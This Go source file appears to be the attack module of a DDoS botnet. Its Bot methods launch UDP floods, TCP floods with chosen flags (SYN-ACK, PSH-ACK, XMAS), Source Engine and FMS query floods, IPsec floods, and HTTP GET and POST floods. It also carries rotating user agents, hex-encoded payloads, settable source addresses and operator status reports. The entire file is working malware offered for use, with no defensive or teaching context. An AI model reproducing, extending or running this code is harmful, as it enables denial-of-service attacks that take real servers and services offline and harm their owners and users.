package lib

import (
	"encoding/json"
	"strings"
)

/*
	GET header
*/
var httpAgent = []string{
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; HbTools 4.7.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; InfoPath.1; HbTools 4.8.0)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.2; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
}

/*
	POST payload
*/
var (
	postPayload, _ = json.Marshal(map[string]string{
		"login":          "\x6C\x00\x6F\x00\x67\x00\x69\x00\x6E",
		"username":       "\x75\x00\x73\x00\x65\x00\x72\x00\x6E\x00\x61\x00\x6D\x00\x65",
		"email":          "\x65\x00\x6D\x00\x61\x00\x69\x00\x6C",
		"password":       "\x70\x00\x61\x00\x73\x00\x73\x00\x77\x00\x6F\x00\x72\x00\x64",
		"pass":           "\x70\x00\x61\x00\x73\x00\x73",
		"login_email":    "\x6C\x00\x6F\x00\x67\x00\x69\x00\x6E\x00\x5F\x00\x65\x00\x6D\x00\x61\x00\x69\x00\x6C",
		"login_password": "\x6C\x00\x6F\x00\x67\x00\x69\x00\x6E\x00\x5F\x00\x70\x00\x61\x00\x73\x00\x73\x00\x77\x00\x6F\x00\x72\x00\x64",
	})
)

var (
	/*
		AMP payload
	*/
	queryPrefix  = "\xff\xff\xff\xff"
	vsePayload   = "\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79"
	fmsPayload   = "\x67\x65\x74\x73\x74\x61\x74\x75\x73"
	ipsecPayload = "\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"

	ReportSwitch, AttackSwitch bool
)

func (b *Bot) UDP(srcIP, dstIP, dstPort, size string) {
	a := &Attack{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: sockBuffer(size),
	}
	a.udpPacket()
	if ReportSwitch {
		b.Report("🛎 STOP UDP FLOOD ATTACKING!!!")
	}
}

func (b *Bot) TCP(flags, srcIP, dstIP, dstPort, size string) {
	if value, key := TCPAttackMap[flags]; key {
		a := &Attack{
			srcAddr:     srcIP,
			dstAddr:     dstIP,
			dstPort:     dstPort,
			ddosPayload: sockBuffer(size),
			synFlag:     value.synFlag,
			ackFlag:     value.ackFlag,
			rstFlag:     value.rstFlag,
			pshFlag:     value.pshFlag,
			finFlag:     value.finFlag,
			urgFlag:     value.urgFlag,
		}
		a.tcpPacket()
		if ReportSwitch {
			b.Report("🛎 STOP TCP[" + strings.ToUpper(CutWord(flags, "-")) + "] FLOOD ATTACKING!!!")
		}
	}
}

func (b *Bot) SAF(srcIP, dstIP, dstPort, size string) {
	a := &Attack{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: sockBuffer(size),
		synFlag:     true,
		ackFlag:     true,
	}
	a.tcpPacket()
	if ReportSwitch {
		b.Report("🛎 STOP SAF FLOOD ATTACKING!!!")
	}
}

func (b *Bot) PAF(srcIP, dstIP, dstPort, size string) {
	a := &Attack{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: sockBuffer(size),
		pshFlag:     true,
		ackFlag:     true,
	}
	a.tcpPacket()
	if ReportSwitch {
		b.Report("🛎 STOP PAF FLOOD ATTACKING!!!")
	}
}

func (b *Bot) XMAS(srcIP, dstIP, dstPort, size string) {
	a := &Attack{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: sockBuffer(size),
		synFlag:     true,
		ackFlag:     true,
		rstFlag:     true,
		pshFlag:     true,
		finFlag:     true,
		urgFlag:     true,
	}
	a.tcpPacket()
	if ReportSwitch {
		b.Report("🛎 STOP XMAS FLOOD ATTACKING!!!")
	}
}

func (b *Bot) VSE(srcIP, dstIP string) {
	a := &Attack{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     "27015",
		ddosPayload: []byte(queryPrefix + vsePayload),
	}
	a.udpPacket()
	if ReportSwitch {
		b.Report("🛎 STOP VSE ATTACKING!!!")
	}
}

func (b *Bot) FMS(srcIP, dstIP string) {
	a := &Attack{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		ddosPayload: []byte(queryPrefix + fmsPayload),
		dstPort:     "30120",
	}
	a.udpPacket()
	if ReportSwitch {
		b.Report("🛎 STOP FMS ATTACKING!!!")
	}
}

func (b *Bot) IPSEC(srcIP, dstIP string) {
	a := &Attack{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		ddosPayload: []byte(ipsecPayload),
		dstPort:     "500",
	}
	a.udpPacket()
	if ReportSwitch {
		b.Report("🛎 STOP IPSEC ATTACKING!!!")
	}
}

func (b *Bot) GET(dstURL string) {
	a := &Attack{
		url:        dstURL,
		httpMethod: "GET",
		reqHeader:  "user-agent",
	}
	a.getRequest()
	if ReportSwitch {
		b.Report("🛎 STOP GET FLOOD ATTACKING!!!")
	}
}

func (b *Bot) POLING(dstURL string) {
	a := &Attack{
		url:        dstURL,
		httpMethod: "POST",
		reqHeader:  string(postPayload),
	}
	a.postRequest()
	if ReportSwitch {
		b.Report("🛎 STOP POLING FLOOD ATTACKING!!!")
	}
}
